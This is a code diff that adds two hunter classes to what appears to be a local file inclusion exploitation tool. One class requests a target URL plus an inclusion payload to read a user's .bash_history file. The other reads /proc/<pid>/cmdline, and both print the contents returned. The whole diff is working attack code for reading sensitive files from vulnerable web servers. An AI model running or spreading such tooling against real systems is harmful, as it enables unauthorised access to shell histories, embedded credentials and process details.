@@ -44,3 +44,33 @@ class LFIHuntBase:
 
     def hunt(self, payload_suffix):
         raise NotImplementedError("Subclasses should implement this!")
+
+class HistoryLFIHunt(LFIHuntBase):
+    def hunt(self, username):
+        history_payload = self.url + self.lfi_payload + f"/home/{username}/.bash_history"
+        req = HTTPClient().get(history_payload)
+        if len(req.text) > self.check_size:
+            lines = [
+                f"Found: \x1b[6;30;42mHistory File for {username.strip()}\x1b[0m",
+                f"\n{req.text}\n",
+                "\033[31m" + "*" * 100 + "\x1b[0m"
+            ]
+            self.output_handler.write_output(lines)
+        else:
+            print(f"No history file found for user(s) {username.strip()}")
+            print("\033[31m" + "*" * 100 + "\x1b[0m")
+
+class ProcessLFIHunt(LFIHuntBase):
+    def hunt(self, pid):
+        process_payload = self.url + self.lfi_payload + f"/proc/{pid}/cmdline"
+        req = HTTPClient().get(process_payload)
+        if len(req.text) > self.check_size:
+            lines = [
+                f"Process: \x1b[6;30;42m/proc/{pid}/cmdline\x1b[0m",
+                f"\n{req.text}\n",
+                "\033[31m" + "*" * 100 + "\x1b[0m"
+            ]
+            self.output_handler.write_output(lines)
+        else:
+            print(f"No process info found for PID {pid}")
+            print("\033[31m" + "*" * 100 + "\x1b[0m")
